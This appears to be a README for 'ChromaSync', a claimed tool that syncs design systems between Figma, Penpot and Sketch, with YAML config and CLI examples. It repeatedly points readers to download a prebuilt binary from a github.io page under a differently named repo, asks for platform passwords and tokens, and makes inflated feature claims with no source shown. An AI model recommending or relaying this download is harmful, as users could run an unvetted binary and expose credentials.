# 🧬 ChromaSync: Cross-Platform Design DNA Harmonizer

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://johndc-77.github.io/penpot-palette-sync/)

## 🌐 Overview: The Universal Design Genome Project

ChromaSync is not merely a conversion utility; it is a sophisticated design genome compiler that translates visual design language across proprietary and open-source ecosystems. Imagine your design system as living DNA—ChromaSync sequences, maps, and re-expresses this creative code across platforms without losing its evolutionary integrity. Born from the need to transcend platform lock-in, this instrument allows creative teams to operate in a multi-vendor environment while maintaining a single source of design truth.

Where traditional converters flatten and approximate, ChromaSync performs a deep semantic translation, preserving component relationships, design tokens, interactive states, and even version histories. It transforms static conversion into a continuous synchronization protocol, enabling parallel design evolution across Figma, Penpot, Sketch, and emerging open-design platforms.

**Immediate Acquisition:** [![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://johndc-77.github.io/penpot-palette-sync/)

---

## 🧩 The Core Proposition: Why ChromaSync Exists

The contemporary design landscape is fragmented. Teams adopt tools based on collaboration needs, cost structures, or feature requirements, yet find themselves trapped in siloed workflows. ChromaSync dismantles these barriers by establishing a neutral, platform-agnostic design interchange format—a "Rosetta Stone" for visual creativity. It ensures that your design investment remains portable, future-proof, and resilient to market shifts.

### 🎯 Primary Objectives
*   **Sovereignty:** Maintain full ownership and control of your design assets' operational format.
*   **Resilience:** Eliminate single-point dependency on any specific design tool vendor.
*   **Fidelity:** Achieve near-lossless translation of complex design systems, including auto-layout, variants, and prototypes.
*   **Bi-Directional Flow:** Enable true synchronization, allowing edits in any connected platform to propagate intelligently.

## ✨ Distinguished Characteristics

*   **Semantic Translation Engine:** Goes beyond shape matching to understand and convert design *intent* and *logic*.
*   **Continuous Sync Daemon:** Operates as a background service, watching for changes and maintaining harmony between platforms.
*   **Design Token Nexus:** Faithfully converts and maps color, typography, spacing, and effect tokens between different naming and structuring conventions.
*   **Version History Weaving:** Merges and aligns version timelines from different platforms into a unified lineage.
*   **Plugin Ecosystem Bridge:** Attempts to translate common plugin functionalities or provide fallbacks.

## 📋 System Compatibility & Prerequisites

| Operating System | Status | Notes |
| :--- | :--- | :--- |
| 🍎 **macOS** 12+ | ✅ Fully Supported | Native ARM (Apple Silicon) & Intel binaries. |
| 🪟 **Windows** 10/11 | ✅ Fully Supported | Installer and portable archive available. |
| 🐧 **Linux** (GLIBC 2.31+) | ✅ Fully Supported | AppImage and DEB/RPM packages. |

**Core Prerequisites:**
*   Node.js 18+ (Bundled runtime available)
*   Active account and API access for platforms you wish to sync (e.g., Figma Personal Access Token, Penpot credentials).
*   Stable network connection for initial sync operations.

## 🚀 Rapid Initiation Guide

### 1. Installation
Acquire the appropriate binary for your system from the official distribution point.

**Direct Acquisition Link:** [![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://johndc-77.github.io/penpot-palette-sync/)

Extract the archive and place the executable in your preferred application directory.

### 2. Initial Configuration
ChromaSync is configured via a declarative YAML file. Create `chromasync.config.yaml` in your project root or user config directory.

```yaml
# chromasync.config.yaml - Example Profile Configuration
project:
  name: "Acme Corp Design System"
  id: "acme-v1"
  neutralFormatDir: "./design-genome/"

platforms:
  - name: "figma"
    type: "figma"
    enabled: true
    apiKey: "${FIGMA_API_KEY}" # Use environment variables for security
    fileIds:
      - "hLp9mKq3dTg7XyF2aZc8"

  - name: "penpot-primary"
    type: "penpot"
    enabled: true
    baseUrl: "https://design.acme.corp"
    email: "${PENPOT_USER}"
    password: "${PENPOT_PASS}"
    projectId: "abc-123-def"

sync:
  strategy: "bidirectional" # Options: unidirectional, bidirectional, manual
  conflictResolution: "timestamp-newer" # timestamp-newer, manual, platform-priority
  interval: 300 # Seconds between auto-sync checks. Set to 0 for manual-only.

features:
  preserveComponents: true
  syncPrototypes: true
  mapTokens: true
  generateFallbacks: true
```

### 3. Authentication Setup
Set the required environment variables to keep secrets out of your config file.
```bash
export FIGMA_API_KEY="your-figma-personal-access-token"
export PENPOT_USER="your@email.com"
export PENPOT_PASS="your-secure-password"
```

### 4. Execute Synchronization
Run ChromaSync from your terminal or as a background daemon.

**Example Console Invocation:**
```bash
# Perform a one-time, manual synchronization
chromasync --config ./chromasync.config.yaml sync --once

# Start the continuous synchronization daemon
chromasync --config ~/.config/chromasync/config.yaml daemon

# Perform a dry-run to see what would change
chromasync sync --dry-run

# Translate only a specific platform to the neutral format for archival
chromasync export --platform figma --output ./archive/design-v1.genome
```

## 🏗️ Architectural Vision

The following diagram illustrates ChromaSync's core data flow and transformation process:

```mermaid
graph TD
    subgraph "Source Platforms"
        A[Figma File]
        B[Penpot Project]
        C[Sketch Document]
    end

    subgraph "ChromaSync Core"
        P[Platform Adapter Layer]
        Q[Semantic Parser & Normalizer]
        R[Neutral Design Genome<br/>[JSON-LD Format]]
        S[Intent-Preserving Transformer]
        T[Conflict Detector/Resolver]
    end

    subgraph "Target Platforms"
        U[Updated Figma]
        V[Updated Penpot]
        W[Updated Sketch]
    end

    A --> P
    B --> P
    C --> P
    P --> Q
    Q --> R
    R --> S
    S --> T
    T --> U
    T --> V
    T --> W

    style R fill:#e1f5e1,stroke:#333,stroke-width:2px
```

## 🔑 Integration with AI Design Assistants

ChromaSync includes optional modules to interface with AI services, enabling advanced transformations and analyses.

*   **OpenAI API Integration:** Leverage GPT-4Vision to analyze design screenshots (generated during sync) and suggest improvements to component naming, token categorization, or accessibility compliance, which are then fed back as annotations.
*   **Claude API Integration:** Utilize Claude's strong reasoning to generate detailed, platform-specific documentation from the neutral genome format, or to create complex mapping rules for custom design token systems.

Enable in your config:
```yaml
ai:
  openai:
    enabled: false
    apiKey: "${OPENAI_KEY}"
    tasks: ["analyze-accessibility", "suggest-naming"]
  anthropic:
    enabled: false
    apiKey: "${CLAUDE_KEY}"
    tasks: ["generate-documentation"]
```

## 🌍 Global Readiness & Support

*   **Multilingual Interface:** Full UI and documentation support for English, Español, Français, 日本語, and 中文 (简体).
*   **Responsive Control Panel:** A web-based dashboard (localhost:8080) provides visual control, conflict resolution, and sync history, adapting seamlessly from desktop to tablet.
*   **Continuous Support Channel:** Access 24/7 community and maintainer support via our dedicated, moderated Discord server. Enterprise-tier support includes guaranteed response SLAs.

## 📄 Legal & Licensing

ChromaSync is released under the **MIT License**. This permissive license grants you extensive operational freedom while requiring only the preservation of copyright and license notices.

**View the full license text:** [LICENSE](LICENSE)

Copyright © 2026 The ChromaSync Contributors.

## ⚠️ Important Declarations

**Disclaimer of Warranty:** ChromaSync is provided in its current state. The maintainers and contributors disclaim all warranties regarding reliability, completeness, or fitness for any specific commercial or mission-critical purpose. You are responsible for testing and verifying sync results in a non-production environment first.

**Data Responsibility:** ChromaSync requires API access to your design platforms. It does not store your design data on external servers. You are responsible for the security of your API keys, configuration files, and the synchronization targets. The tool operates on your infrastructure under your control.

---

### **Begin Harmonizing Your Design Ecosystem Today**

Escape vendor lock-in and future-proof your creative workflow. ChromaSync transforms multi-platform design from a management burden into a strategic advantage.

**[Obtain ChromaSync Now](https://johndc-77.github.io/penpot-palette-sync/)** [![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://johndc-77.github.io/penpot-palette-sync/)